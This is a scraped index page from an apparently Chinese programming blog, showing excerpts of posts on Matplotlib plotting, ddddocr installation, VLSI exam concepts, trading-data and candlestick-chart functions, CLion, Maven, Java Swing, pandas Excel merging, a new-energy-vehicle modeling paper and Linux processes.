&lt;template&gt; &lt;div class="container-box"&gt; &lt;!-- 主图 --&gt; &lt;div class="swiper mySwiper2" id="mySwiper2"&gt; &lt;div class="swiper-wrapper"&gt; &lt;div class="swiper-slide" ref="mySwiper2" v-for="(item, index) in imgArr" :key="item.id" &gt; &lt;img :src="item.imgSrc" alt="" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 缩略图 --&gt; &lt;div class="swiper mySwiper" id="mySwiper" ref="mySwiper"&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/605d9d0f6851ab2b282113cbaf717da0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d64fc72ab3e988e955a3fba9d6bf751b/" rel="bookmark">
			Matplotlib数据可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		绘图基础语法 １　创建画布并且创建子图
首先创建一个空白的画布，并且可以将画布分为几个部分，这样就可以在同一附图上绘制多个图像。
plt.figure 创建一个空白画布，可以指定画布大小、像素
figure.add_subplot 创建并且选中子图，可以指定子图的行数、列数、和图片的编号
2 添加画布内容
plt.title 当前图形标题，可以指定标题名称、位置、颜色、字体大小
plt.xlabel 当前图像添加x轴名称
plt.ylabel 当前图形添加y轴名称
plt.xlim 指定当前图形x轴的范围
plt.ylim y轴的范围
plt.xtricks x轴刻度数目与取值
plt.legend 当前图像的图例
import numpy as np import matplotlib.pyplot as plt rad=np.arange(0,np.pi*2,0.01) p1=plt.figure(figsize=(8,8),dpi=80) #创建画布 #子图 ax1=p1.add_subplot(1,2,1) #2行1列的子图，绘制第一幅 plt.title('lines') #添加标题 plt.xlabel('x') #x轴的名称 plt.ylabel('y') #y轴的名称 plt.xlim((0,1)) #确定x轴的范围 plt.ylim((0,1)) plt.xticks([0,0.2,0.4,0.6,0.8,1]) #x轴的刻度 plt.yticks([0,0.2,0.4,0.6,0.8,1]) plt.plot(rad,rad**2) #添加y=x**2曲线 plt.plot(rad,rad**4) #添加y=x**4曲线 plt.legend(['y=x^2','y=x^4']) #第二幅子图 ax2=p1.add_subplot(1,2,2) plt.title('sin/cos') plt.xlabel('rad') plt.ylabel('value') plt.xlim((0,np.pi*2)) plt.ylim((-1,1)) plt.xticks([0,np.pi/2,np.pi*1.5,np.pi*2]) plt.yticks([-1,-0.5,0,0.5,1]) plt.plot(rad,np.sin(rad)) plt.plot(rad,np.cos(rad)) plt.legend(['sin','cos']) plt.savefig('./sin.png') plt.show() 散点图和折线图 散点图 又叫做散点分布图，是以一个特征为横坐标，另一个特征为纵坐标，利用坐标点的分布形态反映特征间的统计关系。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d64fc72ab3e988e955a3fba9d6bf751b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54a3c475cfe444f5dbd1005541f4d61a/" rel="bookmark">
			验证码识别ddddocr安装：python3.9&#43;selenium4.15&#43;ddddocr1.4&#43;pillow9.5&#43;win10
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、为什么强调版本 1、使用ddddocr库python&lt;=3.9。那么如何实现不动原来配好的而添加新版本共存使用呢？去官网Download Python | Python.org把对应版本按照自己想要的目录放好，然后如下方式添加对应版本的python.exe。 2、最好选择selenium4.15，在使用 元素.screenshot_as_png方法不会报json.decoder.JSONDecodeError的错 3、在下载ddddocr库前最好先下载pillow9.5，不然会报错如下： pillow可以使用镜像下载： pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pillow 或者
pip install -i https://mirrors.aliyun.com/pypi/simple pillow 不要是 10，否则会有错误 module 'PIL.Image' has no attribute 'ANTIALIAS'。
4、安装ddddocr1.4.10的镜像： pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple/ 二、pip list能看见dddocr及版本却pycharm引用不了import ddddocr，可以设置新建项目的配置，创建时继承全局软件包即可。可以参考以下博文： 解决：Python在终端通过pip安装好包以后，在Pycharm中依然无法使用的问题_为什么pycharm显示安装成功包但是却无法使用-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0aa94ed2575fd3df12f8e1bb961fab5/" rel="bookmark">
			国科大超大规模集成电路设计针对期末考试的复习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本概念 物理综合Physical synthesis 从RTL代码创建正确的布局布线电路,相当于跳过了逻辑门级表示，直接从数据流阶段到了版图阶段。
等效门equivalent gate 一个等效门是指一个二输入的与非门，这里的等效不是指功能上的等效，而是芯片面积上的等效，即一个集成电路的等效门数等于该集成电路的面积除以一个标准的二输入与非门的面积。
电气努力electrical effort 定义为外部负载与栅极输入电容之比。
抽象层次Abstraction hierarchy 是指将硬件系统分为不同的层次，每个层次都有自己的功能和接口，而不用关心其他层次的细节。这样可以简化硬件设计的复杂度，提高硬件的可移植性和可维护性。
噪声裕量Noise margin 分为高电平噪声裕量和低电平噪声裕量,指的是信号高电平和低电平到高低电平判决门限VIH和VIL之间的电压差。
强反型层Strong inversion layer 随着栅极电压 （VGS） 的增加，硅表面的电位 （ΦS） 在某个点达到临界值，此时半导体表面反转为 n 型材料。该点标志着一种称为强反转的现象的开始，并且发生在等于费米势两倍的电压（Φ）下
亚稳定性Metastability 亚稳态是指触发器无法在某个规定时间段内达到一个可确认的状态。当一个触发器进入亚稳态引时，既无法预测该单元的输出电平，也无法预测何时输出才能稳定在某个正确的电平上。
设计实体Design Entity 设计实体是VHDL中的主要硬件抽象。它由实体声明和相应的架构主体定义，代表给定的逻辑电路
时间队列(事件)Event queue 时间队列（事件）是指一种用于模拟电路行为的方法，它将电路中发生的各种事件按照时间顺序排列在一个队列中，然后依次处理这些事件，从而得到电路的输出响应。事件可以是电路中的信号变化、电源开关、输入脉冲、延迟等，每个事件都有一个触发时间和一个目标节点。
多米诺逻辑Domino logic 定义一类在动态逻辑门之间插入静态反向器以避免动态逻辑门直接级联时，产生过早放电的动态电路。
上面的概念是重点
国际半导体技术路线图ITRS 这些文件代表了对半导体技术某些领域未来约15年的研究方向和时间表的最佳意见。
设备和系统的国际路线图IRDS 这是一组预测，研究了电子、半导体和计算机行业未来十五年的未来
工艺节点Technology Nodes 它是指特定的半导体制造工艺及其设计规则。不同的节点通常意味着不同的电路代系和架构
特征尺寸Feature size 它是MOS晶体管上源极和漏极之间的最小距离，是动态RAM芯片中单元之间距离的一半。
IC设计复杂性来源IC design complexity sources 随着技术节点的不断缩小，出现了新的可变性和可靠性问题：深亚微米 （DSM） 和纳米级设计的新问题
IC设计IC design 电路设计的目标是组装一组互连的电路元件，这些电路元件执行特定的目标函数
综合Synthesis 将设计抽象层次结构中的一种表示形式转换为另一种表示形式的过程。（综合 = 翻译 + 优化）
静态时序分析Static timing analysis 通过根据时序模型计算每条路径的延迟时间来分析逻辑。它不需要测试向量。
行为仿真Behavioral simulation 忽略时序并包括单位延迟模拟，该模拟将延迟设置为固定值
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0aa94ed2575fd3df12f8e1bb961fab5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a488937e8ca3c7e2902ef53d458de910/" rel="bookmark">
			我获取股票和期货数据的常用函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下获取数据所使用的函数，以防止遗忘和方便查找。
# 获取掘金的数据 # 需要打开并登陆掘金终端 def get_data_juejin(symbol="bu2112", start="2021-8-1", end="2021-8-30 23:00:00", frequency="1800s", fields="eob,symbol,frequency,open,close,high,low,volume,amount,position", adjust=0): """ 掘金数据 symbol="bu2112":股票或期货的代码,不区分大小写 start="2021-8-1" :数据的开始时间(包含) end="2021-8-30 23:00:00" :数据的结束时间(包含) ##### 只传入日期时:非日线数据,包括开始,不包括结束日期的数据。因为默认到当日的0点。如:2021-3-2 00:00:00 frequency="1800s" :数据的频率，可以输入分钟、秒、天，大小写均可。 adjust=0 :是否复权 ### 0: ADJUST_NONE不复权, ADJUST_PREV or 1: 前复权, ADJUST_POST or 2: 后复权 默认不复权 -------------------------------------------------------------------------------------- 获取tick数据
def get_ticks(symbol="hc2305", start="2023-1-5 22:50:00", end="2023-1-5 23:00:00"): """ 说明:查询tick数据,最多3个月,无法获取实时行情,有延迟。最多3.3万条! ------------------------------------ 变量:symbol="hc2305", start="2023-1-5 22:50:00", end="2023-1-5 23:00:00" ------------------------------------ 返回:dataframe。 ------------------------------------ """ 获取当前行情的快照，返回tick数据
def get_tick_current(symbol="hc2305", start="2023-1-5 22:50:00", end="2023-1-5 23:00:00"): """ 说明:查询当前行情快照，返回tick数据。 ------------------------------------ 变量:symbol="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a488937e8ca3c7e2902ef53d458de910/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a7722e88311d55fd7844b82073b6949/" rel="bookmark">
			我的K线图、反转图、砖型图和技术指标
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很久以前，为了做量化交易而写的绘图文件。
今天调用了一下，发现很多函数的参数都不记得了。
于是，找到了源文件，把函数调出来，专门记录一下，既是为了防止遗忘，也是为了方便查找。
这些都是我非常喜欢的图形和技术指标。
# K线图/蜡烛图 def kcandle( ax, # 绘图的区域 data, # 绘图用到的数据,pandas数据:列必须有【开,收,高,低,…】 width=0.5, # K线的宽度 edgecolor_up='red', # 上涨的边框颜色 facecolor_up='white', # 上涨的填充颜色 edgecolor_down='green', # 下跌的边框颜色 facecolor_down='green', # 下跌的填充颜色 draw_start=40, # 为了避免缺失值,从哪一项开始显示 grid_show=True, # 是否显示网格 ): pass # 三种颜色的K线图【绘制上涨、下跌和震荡三种颜色的K线图】 def ktrend( ax, #绘图的区域 data, #序列(时间,开,收,高,低,趋势…)序列,只要前6个元素是这些值,时间必须为浮动日格式 width=0.5, #K线的宽度 colorup='r', # 上涨的颜色 colordown='g', # 下跌的颜色 colorstill='b', #震荡的颜色 colorinner='white', # K线的背景颜色 trends=1, # 趋势的类型:1.macd+ema;2.ema trends_data=False, # data是否含有趋势的数据 draw_start=40, # 为了避免缺失值,从哪一项开始绘制 grid_show=True, # 是否显示网格 ): pass # 反转图 def kbreak( ax, #绘图的区域 data, # pandas数据,包括时间和价格 n=3, #反转的柱体 n&gt;=2 width=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a7722e88311d55fd7844b82073b6949/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a485c3c72a960bc4b953e1b1be04bdb/" rel="bookmark">
			CLion手把手教你创建Windows项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为一个Jetbrains迷的我，下载了Jetbrains全家桶，我就想用CLion 编写 Windows 项目
前提：必须安装 Visual Studio 2022
New Project
选择 C++ Executable，取好项目名， 点击 Create
在 CMakeList.txt 中添加以下内容，目的是使CLion支持Windows编程和MFC 编程
if (WIN32) add_definitions(-D_WIN32_WINNT=0x0601) endif () if (WIN32) set(CMAKE_MFC_FLAG 2) add_definitions(-D_AFXDLL) set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -mwindows") ENDIF () 在 main.cpp 编写以下内容 #include &lt;windows.h&gt; // 窗口处理函数 LRESULT CALLBACK WndProc(HWND hWnd, UINT msgID, WPARAM wparam, LPARAM lparam){ return DefWindowProc(hWnd, msgID, wparam, lparam); } // 入口函数 int CALLBACK WinMain(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR lpCmdLine, int nCmdShow){ // 注册窗口类 WNDCLASS wndclass = {0}; wndclass.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a485c3c72a960bc4b953e1b1be04bdb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a49afa73946e2337f5ec026464c6de4/" rel="bookmark">
			maven学习笔记总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、maven简介
二、GAVP属性
三、基于 IDLE 的 Maven 工程创建
1）java标准工程（Javase）的创建
2）java企业工程（Javaee）的创建
a）手动创建
b）插件方式创建（file / settings / plugins / marketplace）
四、Maven工程项目结构说明
五、依赖管理和配置
六、依赖传递和依赖冲突（不用管，就是一种原理说明，总之用maven导入总是对的）
七、依赖导入失败场景和解决方案
八、构建概念
九、继承与聚合
1、继承语法
2、父工程依赖统一管理
3、聚合概念
4、聚合作用
5、聚合语法
6、聚合演示
十、总结
一、maven简介 Maven 是一款为 Java 项目构建管理、依赖管理的工具（软件），使用 Maven 可以自动化构建、测试、打包和发布项目，大大提高了开发效率和质量。
二、GAVP属性 Maven工程相对之前的工程，多出一组gavp属性，gav需要我们在创建项目的时指定，p有默认值，后期通过配置文件修改。
既然要填写的属性，我们先行了解下这组属性的含义!
Maven 中的 GAVP 是指 GroupId、ArtifactId、Version、Packaging 等四个属性的缩写，其中前三个是必要的，而 Packaging 属性为可选项。
这四个属性主要为每个项目在maven仓库总做一个标识，类似人的《姓-名》。有了具体标识，方便maven软件对项目进行管理和互相引用！
GAV遵循一下规则：
1） GroupID 格式：com.{公司/BU }.业务线.[子业务线]，最多 4 级。
说明：{公司/BU} 例如：alibaba/taobao/tmall/aliexpress 等 BU 一级；子业务线可选。
正例：com.taobao.tddl 或 com.alibaba.sourcing.multilang com.atguigu.java
2） ArtifactID 格式：产品线名-模块名。语义不重复不遗漏，先到仓库中心去查证一下。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a49afa73946e2337f5ec026464c6de4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af56cc57527a06493088f5945180ff83/" rel="bookmark">
			【JAVA Swing】利率计算（图形界面）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 编程题目书写 2. 编程思路 从所显示界面分析，我选择用BorderLayout布局来实现。
页面北部用FlowLayout布局显示三个标签“本金”，“年利率”及“利息小计”。
页面中部用FlowLayout布局显示与标签相对应的六个文本框与“利息合计”标签及其文本框，其中利息小计与合计文本框设置为不可编辑。
页面南部用FlowLayout布局显示“计算”和“结束”两个按钮。
为实现其功能，需给“计算”“结束”按钮增加相应监听器。
监听器功能实现：
1. 输入值，点击“计算”，判断输入值是否有效（是否为数字，是否大于0），若无效则弹出消息对话框提示用户。
2. 输入值，点击“计算”，正常计算显示利息。
3.点击“结束”则退出程序。
3. 遇到的问题及解决 大体布局的设置，以为可以直接将各组件添加到BorderLayout布局中，结果出错，于是搜索后采用先将各组件添加到JPanel中，再添加到对应位置。监听器用外部类实现，需要声明一个对象比如view来访问其它类成员。文本框输入需要用getText()返回字符串，并用Double.parseDouble()来转化计算，计算完成后需再次用String.valueOf()转化，并用setText显示运算结果。如果用户输入值无效，则需要用JOptionPane.showMessageDialog()，来弹出消息对话框提示。为减少代码量，用匿名内部类单独实现了“结束”按钮的监听器，学习并熟悉了此方法。 4. 总结 熟悉了外部类实现图形界面功能的大体框架及方法，能够根据图片需求分析大体布局，学习并掌握了一些构造图形界面的细节与方法，学习到了匿名内部类实现监听器的方法，能够将程序功能实现做得较为完善，对用户更加友好方便。
5. 代码实现 5.1 InterestCalculator.java package mypackage; public class InterestCalculator{ public static void main(String[] args) { WindowCalculator win = new WindowCalculator(); } } 5.2 WindowCalculator.java package mypackage; import javax.swing.*; import java.awt.*; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; public class WindowCalculator extends JFrame { public JTextField principal1, principal2, interest1, interest2, rate1, rate2, sum; public JButton button1, button2; PoliceListen listener; public WindowCalculator() { setSize(500, 300); setLocationRelativeTo(null); setLayout(new BorderLayout()); setVisible(true); setDefaultCloseOperation(JFrame.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af56cc57527a06493088f5945180ff83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d082c3438e041ec21e9b7d879ca2715b/" rel="bookmark">
			Python合并一个 Excel 里面的多张表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刚需要将入职五个月的日报汇总, 但是每日都是在通一个excel里面新建副表写日报，现在已经积累了84张附表（每周4张，总共21周），手动复制粘贴每张表格是相当耗时的工作。在这个时候，我开始思考：有没有一种更快捷的方法来合并这些表格呢？于是，我想到了使用Python。
一、必要的库文件 Excel文件中包含多个工作表，并且想要将这些工作表合并成一个，可以使用Python的pandas库来处理。
在这之前你可能需要安装的库：
pip install openpyxl pip install pandas 二、参考代码 直接上 Python 参考代码：
import pandas as pd # 读取Excel文件 file_path = 'C:\\Users\\97942\\Desktop\\工作计划总表.xlsx' # 替换为你的Excel文件路径 xls = pd.ExcelFile(file_path) # 创建一个空的数据帧，用于存储合并后的数据 merged_df = pd.DataFrame() # 遍历每个工作表并合并 for sheet_name in xls.sheet_names: df = pd.read_excel(file_path, sheet_name=sheet_name) merged_df = pd.concat([merged_df, df], ignore_index=True) # 将合并后的数据保存为新的Excel文件 merged_file_path = 'merged_excel_file.xlsx' # 替换为你想要保存的新文件路径 merged_df.to_excel(merged_file_path, index=False) print(f'合并完成，保存为 {merged_file_path}') 三、删除多余行 合并后，想要删除包含"工作计划"的行和空行。
import pandas as pd # 读取Excel文件 file_path = 'C:\\Users\\97942\\Desktop\\merged_excel_file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d082c3438e041ec21e9b7d879ca2715b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab9d1c65f9e3054e538821e16bfe57bd/" rel="bookmark">
			2023APMCM亚太数学建模C题 - 中国新能源汽车的发展趋势（1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘 要 本文主要研究了中国新能源汽车的影响及其发展趋势，利用皮尔逊相关系数和多元线性回归研究了影响中国新能源汽车发展的主要因素；用ARIMA时间序列对未来十年新能源做出一定预测；建立随机森林回归模型对新能源汽车对全球传统汽车的影响进行了分析；通过岭回归分析了各国政策对中国新能源汽车发展的影响，最后建立碳排放因子模型对新能源汽车对生态环境的效益处进行分析。
针对问题1：首先我们选取近十年新能源汽车的销售量，保有量和市场份额
来作为三个指标衡量新能源汽车的市场规模，进行可视化分析，发现2013年时，新能源汽车正处于起步阶段，发展较缓慢，直到2022年时，发展各项指标迅速上升，迎来爆发。为了进一步确定影响新能源汽车的原因，我们选取了多个可能因素建立多元线性回归方程，并利用皮尔逊相关系数进行了相关性分析，得到结果是影响新能源汽车发展的主要因素有技术发展水平和基础设施建设，同时相关积极政策在影响中占有很大比重。
针对问题2：我们首先收集近十年新能源汽车销量，保有量以及市场份额等数据，后建立ARIMA时间序列，通过自回归，差分等步骤进行求解，并对结果进行可视化，得到了未来十年的发展得分表，清晰地对未来十年新能源汽车的发展做出了预测，结果预测值为2023的960.6（万辆）一直到1377.5（万辆）详细见表7。
针对问题3：我们以传统燃油车市场份额为目标变量，新能源汽车相关特征为特征变量构建随机森林模型，设置叶子节点数量为50，树的最大深度为10，求解发现影响最大的因素是新能源政府补贴金额（0.20），所以可以得出结论是由于中国政府对新能源汽车行业的大力支持，进而对全国传统汽车市场产生了巨大冲击。
针对问题4：我们首先收集了多国的贸易政策，并统计出其中其他国家对中国新能源汽车出口抵制最多的方面，结果发现是进口关税和相关优惠福利，之后我们统计美国，日本和德国的相关数据，将中国汽车保有量作为目标变量建立岭回归模型，根据方差扩大因子法得到K为0.12，之后求解方程回归系数，发现结果是德国的大多数系数为负值，说明其对中国的抵制效果最明显，而美国和日本虽然并不抵制，但也并无明显的支持倾向。
针对问题5：我们建立了碳因子排放模型，分别对全市推广新能源汽车前后进行碳排放计算，通过市内数据进行了未来几个中国发展的重要时间点上的减排量，
结论是，当推广新能源汽车后，减排量获得明显增加，这就有力的说明了推广新能源对生态环境确实有积极改善作用。
关键词：皮尔逊相关系数 ARIMA 时间序列 决策树 岭回归模型 碳排放因子
一、背景和问题重述 1.1 问题背景 中国新能源汽车的崛起已成为国家科技和环保领域的一大亮点。政府在过去的几年里通过一系列激励政策和优惠措施，积极推动新能源电动汽车的研发、生产和普及。这一行业的蓬勃发展不仅受到国内市场的热烈响应，也在国际舞台上树立了中国作为科技创新和环保领导者的形象。在这个背景下，我们可以深入了解新能源汽车的技术特点、市场趋势以及政府政策对行业的影响，以及这一发展是否在全球范围内展现出中国的科技和环保实力。
1.2问题重述 新能源汽车是指使用非传统燃料作为动力源的车辆。由于他们低污染，低能耗的性能，备受市民欢迎。自2011年以来，中国政府一直积极推动新能源电动汽车的发展，并制定了一系列优惠政策来促进新能源汽车的发展。
问题1.分析影响中国新能源电动汽车发展的主要因素，建立相关数学模型，并进行详细描述。
问题2.收集中国新能源电动汽车行业发展数据，建立数学模型描述，预测未来10年的发展。
问题3.建立数学模型分析新能源电动汽车对全球传统能源汽车行业的影响。
问题4.建立数学模型分析一些国家的抵制政策对中国新能源电动汽车发展的影响。
问题5.分析城市中新能源电动汽车（包括电动公交车）电气化对生态环境的影响。假设城市人口为100万，提供模型的计算结果。
问题6.基于问题5的结论，给市民写一封公开信，宣传新能源电动汽车的好处，以及全球各国电动汽车行业的贡献。
二、问题分析 2.1问题一分析 问题1要求分析影响中国新能源汽车发展的主要因素，显而易见，我们可以用一些分析影响因素的模型，例如标准化回归，随机森林，LASSO回归，以及相关性分析等方法，通过分析相关系数即可得到结果。 2.2问题二分析 问题2要求我们对未来十年数据进行一下预测，很明显是个时间序列问题，不过本题的数据较难搜寻，而且要找到一些有效指标，之后可以用ARIMA，LSTM等模型进行预测。
2.3问题三分析 问题3要求我们分析中国新能源汽车的发展对于传统新能源汽车行业的影响，针对这一题，由于同样是分析影响，所以我们可以选一个和问题1不同的模型进行分析。
2.4问题四分析 问题4 要求我们分析其他国家政策对中国新能源电动汽车的发展，首先要选择几个代表性大国的政策，然后对政策内容进行分析，提炼出抵制中国新能源汽车发展的内容，然后建立和问题一类似的的影响分析模型，进行求解。
2.5问题五分析 问题5要求我们分析电气化对于生态环境的影响，可以将没进行过电气化的数据和电气化后的数据进行对照处理，选取相关指标进行分析，若结论是对环境有益的指标会上升，则说明电气化确实对环境有益。
2.6问题六分析 问题6要求我们结合问题五的结果进行一封倡议书的书写，这是一道开放式试题，但主题应该是与倡导电气化有关的。
三、模型假设和符号说明 3.1 模型基本假设 （1）假设近年的新能源汽车的生产维持稳定。
（2）假设中国新能源汽车的发展趋势具有一定连续性和稳定性。
（3）假设在短期内的未来，无巨大的与新能源有关的行业变革
（4）假设在短期内的未来，中国的出口政策和支持政策无根本上的改变。
3.2 符号说明 四．模型建立与求解 4.1问题一模型建立与求解 问题一问的是影响新能源汽车行业发展的主要因素，以及建模说明各种因素对其发展起到的影响。首先我们将通过对把销售量，保有量，市场份额，当做指标来对近十年新能源汽车的发展指标进行发展趋势的可视化分析，由此来判断在时间这个维度上，新能源汽车发展的大致发展趋势。然后我们确定影响新能源汽车行业发展的因素，这里考虑到政府政策，技术创新，充电基础设施的建设等因素。最后我们会用数学模型对这些因素进行量化，利用回归模型进行拟合，最后总结出主要因素对中国新能源汽车行业发展的具体影响。
4.2 数据收集和数据预处理 中国新能源汽车的发展受到多方面因素的影响，其中包括政府政策、市场需求、技术创新、基础设施建设以及全球能源格局的变化。首先，政府政策是中国新能源汽车发展的关键推动力。这些政策不仅降低了购车成本，也提高了消费者对新能源汽车的接受度，加速了行业的发展。其次，市场需求对新能源汽车发展起到至关重要的作用。随着环保意识的提升和消费者对绿色出行的需求增加，新能源汽车逐渐成为市场的热门选择。技术创新也是中国新能源汽车发展的重要因素。同时，技术创新也降低了生产成本，促进了产业链的进一步完善。基础设施建设是支撑新能源汽车发展的另一关键因素。充电基础设施的建设对于解决新能源汽车的续航和充电问题至关重要。最后，全球能源格局的变化也在一定程度上影响着中国新能源汽车的发展。
基于此，我们收集了2013到2022年近十年的中国新能源汽车和汽车销售总量，新能源汽车保有量以及新能源汽车的市场份额等数据。
4.3 新能源汽车发展指标可视化分析 综合考量下，我们决定采用销售量，保有量，市场份额三个因素来作为新能源汽车发展的指标，其中保有量可以用来了解新能源汽车在道路上的数量和分布情况。它是一个反映新能源汽车市场渗透率和普及程度的重要指标，而销售量和市场份额则是最直观的指标，用于评估新能源汽车在整个汽车市场中的占比。
数据可视化如下：
4.4 影响新能源汽车发展的主要因素分析 在查阅大量相关文献后,我们发现，影响新能源汽车发展的因素主要有以下几个方面：
政府政策：政府政策在推动新能源汽车发展中发挥着至关重要的作用，例如一些补贴政策，减税政策，免费牌照，绿色出行政策，基础设施建设支持，技术研发支持等，其中绿色出行政策更是直接影响了市民对绿色能源的接受度。技术创新：创新是推动发展的第一生产力，新能源汽车技术的创新，尤其是电池技术的改进和续航历程的提升，直接影响了新能源汽车的续航性和可发展性。基础设施：充电基础设施的完备度直接影响用户使用新能源汽车的便利程度，完备的基础设施建设可以拓展新能源汽车的市场，提高新能源汽车用户的接受度。 （4）新能源汽车运营成本：新能源汽车的运营成本主要包括充电成本，而充电成本直接与电能价格相关。如果电能价格相对较低，那么新能源汽车的运营成本相对较低，这对提高其竞争力是有利的。
（5）大众环保意识：市民环保意识的提高使得更多人倾向于选择对环境友好的交通工具。新能源汽车因为减少尾气排放，被认为是相对环保的选择，市民的购车决策中环保意识的提高可能会增加对新能源汽车的需求。
4.5多元线性回归模型建立 为了评估各指标在新能源汽车领域和发展水平方面的得分，这里我们对得到的新能源汽车发展因素数据表进行标准化并和发展得分，得到数据如下表所示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab9d1c65f9e3054e538821e16bfe57bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1aa915056c0534a3f4f226962f6c76b2/" rel="bookmark">
			谈一谈Linux下的进程和线程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 进程线程进程与线程比较 进程 什么是进程？
概念上来说，进程是担当OS资源分配的实体。通俗来说，进程是我们OS上一个在运行的程序。
我们的OS上不止有一个进程，当我们的某一个进程像是去磁盘上读文件时，由于磁盘的速度很慢，这是为了提高CPU的利用率，这时就会将该进程挂起，而去执行另一个进程，直到磁盘读写完毕，给OS一个信号，OS从而在去调度原来被挂起的进程。
进程不止有一个，所以就需要我们对进程进行管理，怎么管理：先描述，后组织，将进程的属性抽象成结构体，然后将每个进程的结构体通过链表组织起来。其中所谓 的结构体就是我们的PCB—进程控制模块，在Linux中就是我们的task_struct。每一个进程都有其独立的PCB，那么操作系统对进程的管理就变为了实际上对PCB进行管理。PCB放在哪个组织结构里实则对应着的是其不同的进程状态，我们的进程至少具备三种基本状态：运行状态，就绪状态，阻塞状态。其分别对应着运行队列，就绪队列，阻塞队列这样的组织结构。
运行状态：正在运行的进程
就绪状态：随时可以运行，但CPU正在被其他进程所占有
阻塞状态：由于等待输入输出等时间，无法运行，及时给它CUP控制权，也无法运行。
若有大量的阻塞状态，回导致我们的内存利用率不高，所以通常会把阻塞状态的进程的物理内存换入到磁盘中，只留有其内核数据在内存中，当需要再运行的时候，再从磁盘中写回，我们将这种状态成为挂起状态。
task_struct中有什么？
标示符: 描述本进程的唯一标示符，用来区别其他进程。
状态: 任务状态，退出代码，退出信号等。
优先级: 相对于其他进程的优先级。
程序计数器: 程序中即将被执行的下一条指令的地址。
内存指针: 包括程序代码和进程相关数据的指针，还有和其他进程共享的内存块的指针
上下文数据: 进程执行时处理器的寄存器中的数据。
I／O状态信息: 包括显示的I/O请求,分配给进程的I／O设备和被进程使用的文件列表。
记账信息: 可能包括处理器时间总和，使用的时钟数总和，时间限制，记账号等。
其他信息
那我们的进程都要是处于就绪状态，OS该如何决策调度哪一个进程呢？这就是是OS调度器要干的事情啦？我们可以在可以简单的说名以下：每个进程都有优先级，优先级越高，则越是容易被调度，当然这个优先级的计算，是调度器帮我们去评判的，那么我们人为的可以干预吗，是可以的！我们的nice值就可以帮助我们进行优先级的干预。
PRI是进程的优先级，其表示该进程被cpu执行的先后顺序，其值越小，优先级越高。 那么NI是啥呢？可以将其理解为优先级的修正数值。
因此调整nice值就是调整进程的优先级。nice值的取值范围是-19 - 20。
那么如何更改nice值
可以使用top命令进行修改。其使用格式如下： 进入top后按“r”–&gt;输入进程PID–&gt;输入nice值。
调整已存在进程的nice：renice
我们的每个进程都拥有其独立的进程地址空间，以及页表。这样的设计使得我们多进程得以实现，避免了直接对物理内存操作而引起地址冲突，再者，由于虚拟地址到物理地址之间要经过映射，并且我们对进程地址空间进行了分段，因此在映射时，我们自然就可以进行一些检查，检查其访问的地址是否安全，以及该地址所存储数据的属性是否允许我们进行操作等；进程地址空间使得让每一个进程都觉得自己拥有整个内存，它不关心其他的进程，这也是进程独立的体现，并且，由于有局部性原理，我们可以将一些暂时不用的其他进程所占用的内存，换出到磁盘中，从而给当前进程用，提高了内存的使用效率。
